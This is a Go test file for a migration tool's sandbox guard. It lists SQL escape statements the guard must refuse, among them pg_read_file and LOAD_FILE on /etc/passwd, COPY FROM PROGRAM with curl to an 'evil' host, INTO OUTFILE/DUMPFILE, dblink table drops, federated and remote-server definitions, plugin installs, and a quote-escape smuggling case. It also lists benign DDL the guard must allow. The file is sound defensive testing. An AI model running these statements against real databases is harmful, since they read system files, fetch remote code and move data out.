package atlasschema_test

import (
	"testing"

	qt "github.com/frankban/quicktest"

	"github.com/stokaro/ptah/internal/atlasschema"
)

func TestCheckPlanStatementsSandboxableRefusesEscapes(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		dialect   string
		construct string
	}{
		{
			name:      "sqlite_attach_database",
			statement: `ATTACH DATABASE '/tmp/target.db' AS victim`,
			construct: "ATTACH",
		},
		{
			name:      "sqlite_attach_without_database_keyword",
			statement: `attach '/tmp/target.db' as victim`,
			construct: "ATTACH",
		},
		{
			name:      "sqlite_detach",
			statement: `DETACH DATABASE victim`,
			construct: "DETACH",
		},
		{
			name:      "sqlite_vacuum_into",
			statement: `VACUUM INTO '/tmp/copy.db'`,
			construct: "VACUUM INTO",
		},
		{
			name:      "sqlite_pragma_temp_store_directory",
			statement: `PRAGMA temp_store_directory = '/tmp/evil'`,
			construct: "PRAGMA temp_store_directory",
		},
		{
			name:      "postgres_do_block_calling_dblink",
			statement: "DO $$ BEGIN PERFORM dblink_exec('dbname=target', 'DROP TABLE users'); END $$",
			construct: "DO",
		},
		{
			name:      "postgres_function_body_reading_files",
			statement: "CREATE FUNCTION pwn() RETURNS text AS $$ BEGIN RETURN pg_read_file('/etc/passwd'); END $$ LANGUAGE plpgsql",
			construct: "pg_read_file",
		},
		{
			name:      "postgres_function_body_in_plain_string",
			statement: `CREATE FUNCTION pwn() RETURNS text AS 'SELECT pg_read_file(''/etc/passwd'')' LANGUAGE sql`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_function_body_with_tagged_dollar_quote",
			statement: "CREATE OR REPLACE FUNCTION pwn() RETURNS void AS $body$ BEGIN PERFORM dblink('dbname=target', 'SELECT 1'); END $body$ LANGUAGE plpgsql",
			construct: "dblink",
		},
		{
			name:      "mysql_federated_engine",
			statement: "CREATE TABLE remote_users (id integer) ENGINE=FEDERATED CONNECTION='mysql://user@evil/db/users'",
			construct: "ENGINE=FEDERATED",
		},
		{
			name:      "mysql_create_server",
			statement: `CREATE SERVER evil FOREIGN DATA WRAPPER mysql OPTIONS (HOST 'evil.example', DATABASE 'x')`,
			construct: "CREATE SERVER",
		},
		{
			name:      "mysql_load_file_function",
			statement: `INSERT INTO t (blob_col) VALUES (LOAD_FILE('/etc/passwd'))`,
			construct: "LOAD_FILE",
		},
		{
			name:      "mysql_install_plugin",
			statement: `INSTALL PLUGIN evil SONAME 'evil.so'`,
			construct: "INSTALL PLUGIN",
		},
		{
			name:      "mysql_install_component",
			statement: `INSTALL COMPONENT 'file://component_evil'`,
			construct: "INSTALL COMPONENT",
		},
		{
			name:      "mysql_data_directory",
			statement: `CREATE TABLE t (id integer) DATA DIRECTORY = '/var/evil'`,
			construct: "DATA DIRECTORY",
		},
		{
			name:      "mysql_index_directory",
			statement: `CREATE TABLE t (id integer) INDEX DIRECTORY = '/var/evil'`,
			construct: "INDEX DIRECTORY",
		},
		{
			name:      "mysql_load_data_local_infile",
			statement: `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE users`,
			construct: "LOAD DATA INFILE",
		},
		{
			name:      "mysql_select_into_outfile",
			statement: `SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'`,
			construct: "SELECT ... INTO OUTFILE",
		},
		{
			name:      "mysql_select_into_dumpfile",
			statement: `SELECT payload FROM t INTO DUMPFILE '/tmp/x.so'`,
			construct: "SELECT ... INTO DUMPFILE",
		},
		{
			name:      "postgres_copy_from_program",
			statement: `COPY users FROM PROGRAM 'curl http://evil/x'`,
			construct: "COPY ... PROGRAM",
		},
		{
			name:      "postgres_copy_to_file",
			statement: `COPY users TO '/tmp/users.csv'`,
			construct: "COPY with a file path",
		},
		{
			name:      "postgres_dblink",
			statement: `SELECT * FROM dblink('dbname=target', 'SELECT 1') AS t(x int)`,
			construct: "dblink",
		},
		{
			name:      "postgres_dblink_exec_prefix",
			statement: `SELECT dblink_exec('dbname=target', 'DROP TABLE users')`,
			construct: "dblink",
		},
		{
			name:      "postgres_fdw_extension",
			statement: `CREATE EXTENSION postgres_fdw`,
			construct: "postgres_fdw",
		},
		{
			name:      "postgres_file_fdw_extension",
			statement: `CREATE EXTENSION file_fdw`,
			construct: "file_fdw",
		},
		{
			name:      "postgres_pg_read_file",
			statement: `SELECT pg_read_file('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_qualified_pg_read_file",
			statement: `SELECT pg_catalog.pg_read_file('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_lo_export",
			statement: `SELECT lo_export(loid, '/tmp/out.bin') FROM t`,
			construct: "lo_export",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := qt.New(t)

			err := atlasschema.CheckPlanStatementsSandboxable([]string{
				`CREATE TABLE ok (id integer)`,
				tt.statement,
			}, tt.dialect)

			// The refusal names the offending statement position and the
			// construct, and it must be recognizable as an escape refusal.
			c.Assert(err, qt.IsNotNil)
			c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue)
			c.Assert(err, qt.ErrorMatches,
				`pre-planned migration cannot be verified on a dev database: statement 2 uses `+tt.construct+`, which .*`)
			c.Assert(err, qt.ErrorMatches, `(?s).*Replaying it would not stay inside the dev database.*`)
		})
	}
}

func TestCheckPlanStatementsSandboxableAllowsOrdinaryDDL(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		dialect   string
	}{
		{
			name:      "table_named_attachment",
			statement: `CREATE TABLE attachment (id integer NOT NULL PRIMARY KEY)`,
		},
		{
			name:      "quoted_table_named_attach",
			statement: `CREATE TABLE "attach" (id integer)`,
		},
		{
			name:      "backticked_column_named_outfile",
			statement: "ALTER TABLE `reports` ADD COLUMN `outfile` text",
		},
		{
			name:      "quoted_column_named_infile",
			statement: `ALTER TABLE reports ADD COLUMN "infile" text`,
		},
		{
			// Bare, unquoted names that merely collide with the keywords:
			// INTO OUTFILE is the escape, the word alone is not.
			name:      "bare_column_named_outfile",
			statement: `ALTER TABLE reports ADD COLUMN outfile text`,
		},
		{
			name:      "bare_column_named_dumpfile",
			statement: `ALTER TABLE reports ADD COLUMN dumpfile text`,
		},
		{
			name:      "bare_column_named_infile",
			statement: `ALTER TABLE reports ADD COLUMN infile text`,
		},
		{
			// The table name is followed by `(`, which is a DDL name
			// position, not a dblink call site.
			name:      "table_named_dblink_events",
			statement: `CREATE TABLE dblink_events (id integer NOT NULL PRIMARY KEY, note text)`,
		},
		{
			name:      "table_named_dblink_events_if_not_exists",
			statement: `CREATE TABLE IF NOT EXISTS dblink_events (id integer)`,
		},
		{
			name:      "insert_into_table_named_dblink_events",
			statement: `INSERT INTO dblink_events (id) VALUES (1)`,
		},
		{
			name:      "column_named_dblink_url",
			statement: `ALTER TABLE services ADD COLUMN dblink_url text`,
		},
		{
			name:      "index_named_lo_import",
			statement: `CREATE INDEX lo_import ON objects (name)`,
		},
		{
			name:      "index_named_pg_read_file",
			statement: `CREATE INDEX pg_read_file ON objects (name)`,
		},
		{
			name:      "bracket_quoted_outfile_column",
			statement: `ALTER TABLE reports ADD COLUMN [outfile] nvarchar(100)`,
			dialect:   "sqlserver",
		},
		{
			name:      "bracket_quoted_dblink_table",
			statement: `CREATE TABLE [dblink] (id int)`,
			dialect:   "sqlserver",
		},
		{
			name:      "bracket_quoted_identifier_containing_semicolon_and_attach",
			statement: `CREATE TABLE [a;ATTACH] (id int)`,
			dialect:   "sqlserver",
		},
		{
			name:      "string_literal_containing_attach",
			statement: `INSERT INTO notes (body) VALUES ('please ATTACH DATABASE later')`,
		},
		{
			name:      "string_literal_containing_copy_program",
			statement: `ALTER TABLE t ADD COLUMN note text DEFAULT 'COPY x FROM PROGRAM ls'`,
		},
		{
			name:      "comment_mentioning_attach",
			statement: "-- ATTACH DATABASE '/tmp/x.db' AS y\nCREATE TABLE ok (id integer)",
		},
		{
			name:      "copy_from_stdin_has_no_file_argument",
			statement: `COPY users (id, name) FROM STDIN`,
		},
		{
			name:      "ordinary_create_index",
			statement: `CREATE INDEX idx_posts_user_id ON posts (user_id)`,
		},
		{
			name:      "column_named_program",
			statement: `CREATE TABLE jobs (program text NOT NULL)`,
		},
		{
			name:      "column_named_directory",
			statement: `CREATE TABLE data (directory text NOT NULL)`,
		},
		{
			name:      "vacuum_without_into",
			statement: `VACUUM`,
		},
		{
			name:      "pragma_foreign_keys",
			statement: `PRAGMA foreign_keys = ON`,
		},
		{
			name:      "plain_function_without_escapes",
			statement: "CREATE FUNCTION bump() RETURNS integer AS $$ BEGIN RETURN 1; END $$ LANGUAGE plpgsql",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := qt.New(t)

			err := atlasschema.CheckPlanStatementsSandboxable([]string{tt.statement}, tt.dialect)

			c.Assert(err, qt.IsNil)
		})
	}
}

func TestCheckPlanStatementsSandboxableScansBothStringEscapeDialects(t *testing.T) {
	c := qt.New(t)

	// Under MySQL-family backslash escapes the literal ends at the escaped
	// quote and ATTACH is code; under PostgreSQL rules the same bytes parse
	// differently. Scanning both interpretations means neither reading can
	// smuggle an escape past the guard.
	statement := `INSERT INTO t VALUES ('\'); ATTACH DATABASE '/tmp/x.db' AS y; --')`

	err := atlasschema.CheckPlanStatementsSandboxable([]string{statement}, "mysql")

	c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue, qt.Commentf("err=%v", err))
}

func TestCheckPlanStatementsSandboxableScansNestedRoutineBodies(t *testing.T) {
	c := qt.New(t)

	// A routine body that builds another routine still gets scanned.
	statement := "CREATE FUNCTION outer_fn() RETURNS void AS $outer$ BEGIN " +
		"EXECUTE 'CREATE FUNCTION inner_fn() RETURNS text AS $inner$ BEGIN RETURN pg_read_file(''/etc/passwd''); END $inner$ LANGUAGE plpgsql'; " +
		"END $outer$ LANGUAGE plpgsql"

	err := atlasschema.CheckPlanStatementsSandboxable([]string{statement}, "postgres")

	c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue, qt.Commentf("err=%v", err))
}

func TestCheckPlanStatementsSandboxableAcceptsEmptyInput(t *testing.T) {
	c := qt.New(t)

	c.Assert(atlasschema.CheckPlanStatementsSandboxable(nil, "sqlite"), qt.IsNil)
	c.Assert(atlasschema.CheckPlanStatementsSandboxable([]string{"", "   "}, "sqlite"), qt.IsNil)
}
